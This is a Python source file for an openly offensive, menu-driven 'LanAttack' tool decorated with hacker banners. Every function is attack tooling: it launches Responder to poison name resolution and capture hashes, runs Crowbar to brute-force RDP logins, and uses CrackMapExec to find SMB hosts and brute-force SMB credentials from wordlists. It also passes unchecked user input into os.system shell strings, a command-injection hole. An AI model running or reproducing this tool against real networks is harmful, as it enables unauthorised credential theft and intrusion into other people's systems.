import os
from .banners_spooflib import fsociety_banner, wifi_banner, pirate_banner, dedsec_banner
from time import sleep


cyan = '\x1b[0;36m'
green = '\x1b[0;32m'
oke_green = '\x1b[0;92m'
light_green = '\x1b[1;32m'
white = '\x1b[1;37m'
red = '\x1b[1;31m'
yellow = '\x1b[0;33m'
BlueF = '\x1b[1;34m'
RESET = "\x1b[0m"
orange = '\x1b[38;5;166m'
Blue = '\033[1;34m'
Green_light = '\033[1;32m'
grwh_prompt = f'{green}[{white}+{green}]{white} '
red_prompt = f'{red}[{white}+{red}]{white} '


def clear():
    os.system('clear')


def start_responder(INTERFACE):
    clear()
    os.system(f'sudo responder -I {INTERFACE}')


def wordlist_check(file1, file2):
    if os.path.exists(file1) and os.path.exists(file2):
        return True
    else:
        return False


def crowbar_rdp(IP):
    clear()
    pirate_banner('RDP', 'CROWBAR')
    while True:
        try:
            input_str = input(f'{grwh_prompt}Enter wordlist {green}(With Comma-Seperated, No Spaces!){white}: ')
            if input_str.lower() == 'back':
                break

            elif ', ' in input_str:
                print(f'{red_prompt} Please correct your wordlists!\n{grwh_prompt}EXAMPLE: users.txt,passwd.txt')
                continue

            usernames, passwords = input_str.split(',')

            try:

                if wordlist_check(usernames, passwords):
                    clear()
                    dedsec_banner('BRUTE-FORCE')
                    sleep(3)
                    command = f'crowbar -b rdp -U {usernames} -C {passwords} -s {IP} -n 100 -t 200 -v -d'
                    os.system(command)
                    input(f'{grwh_prompt} Enter to continue...')
                    break

                else:
                    print(f'\n{grwh_prompt}Usernames or Passwords file does not exist!\n')

            except KeyboardInterrupt:
                print(f'{red_prompt}CTRL+C Detected...')
                input(f'{grwh_prompt} Enter to continue...')
                break

        except:
            print(f'\n{red_prompt}An unforeseen mistake has been made, please try again!.\n'
                  f'{red_prompt}For back menu use command: back')


def detect_smb(IP):
    clear()
    dedsec_banner('DETECT')
    command = f'crackmapexec smb {IP}'
    try:
        os.system(command)
    except KeyboardInterrupt:
        print(f'{red_prompt} CTRL+C Detecting... Abort')
        input(f'{grwh_prompt} Enter to continue...')
        sleep(1)


def check_range_ip(host):
    if '/' in host:
        return True
    else:
        return False

def smb_brute(IP):
    clear()
    pirate_banner('CRACKMAPEXEC', 'SMB')
    while True:
        try:
            input_str = input(f'{grwh_prompt}Enter wordlist {green}(With Comma-Seperated, No Spaces!){white}: ')
            if input_str.lower() == 'back':
                break

            elif ', ' in input_str:
                print(f'{red_prompt} Please correct your wordlists!\n{grwh_prompt}EXAMPLE: users.txt,passwd.txt')
                continue

            usernames, passwords = input_str.split(',')

            try:

                if wordlist_check(usernames, passwords):
                    clear()
                    dedsec_banner('BRUTE-FORCE')
                    sleep(3)
                    command = f'crackmapexec smb {IP} -U {usernames} -P {passwords}'
                    os.system(command)
                    input(f'{grwh_prompt} Enter to continue...')
                    break

                else:
                    print(f'\n{grwh_prompt}Usernames or Passwords file does not exist!\n')

            except KeyboardInterrupt:
                print(f'{red_prompt}CTRL+C Detected...')
                input(f'{grwh_prompt} Enter to continue...')
                break

        except:
            print(f'\n{red_prompt}An unforeseen mistake has been made, please try again!.\n'
                  f'{red_prompt}For back menu use command: back')

#
# def helped():
#     help_table = PrettyTable
#     help_table.field_names = ["COMMAND", "DESCRIPTION"]
#     COMMANDS = {
#         'clear': 'Clear Console',
#         'back': 'Back to main menu',
#         'CTRL+C': 'Aborting Script'
#     }
#     help_table.add_row(COMMANDS)
#
#     print(f'{grwh_prompt}Help:\\\n{help_table}')


def main_spoof_lib():
    fsociety_banner()
    while True:
        shell = input(f'''{white}
{green}┌─[{red}LanAttack{green}]──[{red}~{green}]─[{orange}0xSp00f{green}]{green}:
└─────►{orange} ''').lower()

        while not shell in ['1', '2', '3', '4', '5', '6', '7', 'help', 'clear', 'main']:
            print(f'{white}[{red}!{white}]{white} Invalid option!')
            shell = input(f'''{white}
{green}┌─[{red}LanAttack{green}]──[{red}~{green}]─[{orange}0xSp00f{green}]{green}:
└─────►{orange} ''').lower()

        else:
            if shell == '1':
                clear()
                wifi_banner()
                interface_sniff = input(f'{grwh_prompt} Enter your interface: ')
                start_responder(interface_sniff)
                input(f'{grwh_prompt}Enter to continue...')

            elif shell == '2':
                ip_rdp = input(f'{grwh_prompt}Enter IP to open port 3389: ')
                crowbar_rdp(ip_rdp)

            elif shell == '3':
                ip_detect_smb = input(f'\n{Green_light}──────►{grwh_prompt}Enter ip to detect smb hosts: ')
                if check_range_ip(ip_detect_smb):
                    detect_smb(ip_detect_smb)
                else:
                    print(f'\n{red}──────►{red_prompt}Your ip is not range!')


            elif shell == '4':
                ip_smb = input(f'{grwh_prompt}Enter ip with smb-service to brute: ')
                smb_brute(ip_smb)

            elif shell == '5':
                break

            elif shell == 'clear' or shell == '6':
                clear()

            elif shell == 'help' or shell == '7':
                # helped()
                pass

            elif shell == 'main':
                clear()
                fsociety_banner()

            else:
                print(f'{red_prompt}Invalid Option!')
